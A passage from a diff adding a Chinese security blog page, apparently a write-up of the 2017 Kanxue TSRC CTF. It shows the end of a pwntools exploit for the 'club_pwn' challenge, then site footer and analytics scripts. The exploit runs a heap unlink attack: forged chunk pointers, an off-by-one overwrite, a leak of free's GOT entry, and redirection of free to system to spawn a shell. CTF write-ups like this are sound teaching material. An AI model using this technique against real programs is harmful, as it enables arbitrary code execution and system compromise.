class="line">io.recvuntil(<span class="string">&#x27;You get a secret:&#x27;</span>)</span><br><span class="line">seed_addr = int(io.recvuntil(<span class="string">&#x27;!&#x27;</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;seed_addr: 0x%x&quot;</span> % int(seed_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got_addr = seed_addr<span class="number">-0x202148</span>+<span class="number">0x202018</span></span><br><span class="line">p_addr = seed_addr<span class="number">-0x202148</span>+<span class="number">0x202110</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;free_got_addr:&#x27;</span>+hex(free_got_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake chunk and get shell</span></span><br><span class="line"></span><br><span class="line">fake_fd = p64(p_addr<span class="number">-0x18</span>)</span><br><span class="line">fake_bk = p64(p_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_a_box(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">get_a_box(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">get_a_box(<span class="number">3</span>,<span class="number">0x110</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;get 3 box&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">raw_input(<span class="string">&#x27;destory_2_box&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">2</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">fake_fd = p64(p_addr<span class="number">-0x18</span>)</span><br><span class="line">fake_bk = p64(p_addr<span class="number">-0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+fake_fd+fake_bk+<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x220</span><span class="number">-0x100</span>) </span><br><span class="line">raw_input(<span class="string">&#x27;off by one to leak &#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;get 4 box size 0x220&#x27;</span>)</span><br><span class="line">get_a_box(<span class="number">4</span>,<span class="number">0x220</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;fill the 4 box&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">4</span>,payload)</span><br><span class="line">raw_input(<span class="string">&#x27;destory_3_box&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;leak got addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;leaking address...&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">2</span>,p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(free_got_addr))</span><br><span class="line">raw_input(<span class="string">&#x27;leakk.......&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">raw_input(<span class="string">&#x27;leak free addr&#x27;</span>)</span><br><span class="line">show_message(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">free_addr = u64(io.recvuntil(<span class="string">&#x27;You have 6 operation :&#x27;</span>)[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">system_addr = int(free_addr)-free_offset+system_offset</span><br><span class="line">log.info(<span class="string">&#x27;system address:&#x27;</span>+hex(system_addr))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">raw_input(<span class="string">&#x27;get shell~~~~~~&#x27;</span>)</span><br><span class="line">leave_me_a_message(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">pause()</span><br><span class="line">leave_me_a_message(<span class="number">3</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&#x27;unlink to get shell&#x27;</span>)</span><br><span class="line">destory_a_box(<span class="number">3</span>)   </span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># log.info(&quot;leak .....libc.....&quot;)</span></span><br><span class="line"><span class="comment"># get_a_box(1,0x80)</span></span><br><span class="line"><span class="comment"># get_a_box(2,0xa0)</span></span><br><span class="line"><span class="comment"># get_a_box(3,0xb0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># destory_a_box(2)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># #gdb.attach(io)</span></span><br><span class="line"><span class="comment"># raw_input(&#x27;leak.....libc&#x27;)</span></span><br><span class="line"><span class="comment"># show_message(2)</span></span><br><span class="line"><span class="comment"># main_arena_addr = u64(io.recvuntil(&#x27;You have 6 operation :&#x27;)[1:7]+&#x27;\x00&#x27;*2)</span></span><br><span class="line"><span class="comment"># print hex(main_arena_addr)</span></span><br><span class="line"><span class="comment"># #log.info(&quot;main_arena_addr: 0x%x&quot; % hex(main_arena_addr))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-Helllo-CTF"><span class="toc-number">1.</span> <span class="toc-text">第一题 Helllo-CTF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-ctf2017-Fpc"><span class="toc-number">2.</span> <span class="toc-text">第二题 ctf2017_Fpc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98-crackMe"><span class="toc-number">3.</span> <span class="toc-text">第三题 crackMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98-club-pwn"><span class="toc-number">4.</span> <span class="toc-text">第四题 club_pwn</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&text=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&is_video=false&description=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=看雪.TSRC 2017CTF秋季赛　&body=Check out this article: https://bestwing.me/2017-Kanxue-TSRC-fall-race.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&title=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&name=看雪.TSRC 2017CTF秋季赛　&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-Kanxue-TSRC-fall-race.html&t=看雪.TSRC 2017CTF秋季赛　"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
